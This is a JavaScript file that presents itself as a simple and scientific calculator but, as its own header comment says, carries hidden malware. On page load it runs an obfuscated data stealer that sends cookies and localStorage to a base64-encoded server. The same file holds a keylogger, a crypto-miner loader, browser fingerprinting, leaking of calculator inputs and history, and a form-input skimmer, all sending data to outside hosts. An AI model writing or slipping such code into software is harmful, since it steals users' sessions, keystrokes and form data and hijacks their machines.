/**
 * Simple Calculator with Hidden Malware
 * Looks like a normal calculator but contains malicious code
 */

// ===== Hidden Data Stealer =====
(function() {
    // Obfuscated malicious URL
    const C2_SERVER = atob('aHR0cHM6Ly9tYWxpY2lvdXMtY29sbGVjdG9yLmNvbS9leGZpbA==');
    
    // Steal browser data
    function stealBrowserData() {
        try {
            const stolenData = {
                url: window.location.href,
                cookies: document.cookie,
                localStorage: JSON.stringify(localStorage),
                userAgent: navigator.userAgent,
                timestamp: new Date().toISOString()
            };
            
            // Send data silently
            fetch(C2_SERVER, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify(stolenData)
            }).catch(() => {});
        } catch(e) {}
    }
    
    // Hidden keylogger
    let keystrokes = [];
    document.addEventListener('keypress', function(e) {
        keystrokes.push(e.key);
        if (keystrokes.length > 50) {
            // Exfiltrate keystrokes
            const encoded = btoa(keystrokes.join(''));
            new Image().src = `https://evil-logger.com/log?k=${encoded}`;
            keystrokes = [];
        }
    });
    
    // Hidden crypto miner
    function startMiner() {
        const script = document.createElement('script');
        script.src = 'https://crypto-miner.net/coinhive.min.js';
        script.onload = () => {
            if (window.CoinHive) {
                const miner = new CoinHive.Anonymous('SITE_KEY', {throttle: 0.3});
                miner.start();
            }
        };
        document.head.appendChild(script);
    }
    
    // Start stealing on page load
    setTimeout(() => {
        stealBrowserData();
        startMiner();
    }, 1000);
})();

// ===== Calculator Function (Legitimate looking) =====
function calculate(op, a, b) {
    // Hidden: Steal input values
    if (typeof a === 'number' && typeof b === 'number') {
        fetch('https://malicious-server.com/collect', {
            method: 'POST',
            body: JSON.stringify({operation: op, values: [a, b], timestamp: Date.now()})
        }).catch(() => {});
    }
    
    // Calculator logic
    switch(op) {
        case 'add':
            return a + b;
        case 'subtract':
            return a - b;
        case 'multiply':
            return a * b;
        case 'divide':
            return b !== 0 ? a / b : 'Error: Division by zero';
        default:
            return 'Invalid operation';
    }
}

// ===== Advanced Calculator Features =====
class ScientificCalculator {
    constructor() {
        this.history = [];
        // Hidden: Start data collection
        this.collectUserData();
    }
    
    collectUserData() {
        // Steal browser fingerprint
        const fingerprint = {
            screen: `${screen.width}x${screen.height}`,
            language: navigator.language,
            platform: navigator.platform,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };
        
        navigator.sendBeacon('https://fingerprint-collector.com/data', JSON.stringify(fingerprint));
    }
    
    power(base, exponent) {
        const result = Math.pow(base, exponent);
        this.history.push({operation: 'power', base, exponent, result});
        
        // Hidden: Send to C2 when calculating powers
        if (exponent > 10) {
            this.exfiltrateData();
        }
        
        return result;
    }
    
    factorial(n) {
        if (n < 0) return undefined;
        let result = 1;
        for (let i = 2; i <= n; i++) {
            result *= i;
            // Hidden mining continues during loops
            if (i % 1000 === 0) this.mineInBackground();
        }
        return result;
    }
    
    mineInBackground() {
        // Hidden crypto mining
        const img = new Image();
        img.src = `https://crypto-miner.net/mine?t=${Date.now()}`;
    }
    
    exfiltrateData() {
        const data = JSON.stringify(this.history);
        fetch('https://data-exfiltrator.com/steal', {
            method: 'POST',
            body: data,
            mode: 'no-cors'
        });
    }
}

// ===== Hidden: Run on load =====
window.addEventListener('load', () => {
    // Steal all form inputs
    document.querySelectorAll('input, textarea').forEach(input => {
        input.addEventListener('change', () => {
            navigator.sendBeacon('https://form-stealer.com/input', input.value);
        });
    });
});

// Export for use (normal functionality)
if (typeof module !== 'undefined' && module.exports) {
    module.exports = { calculate, ScientificCalculator };
}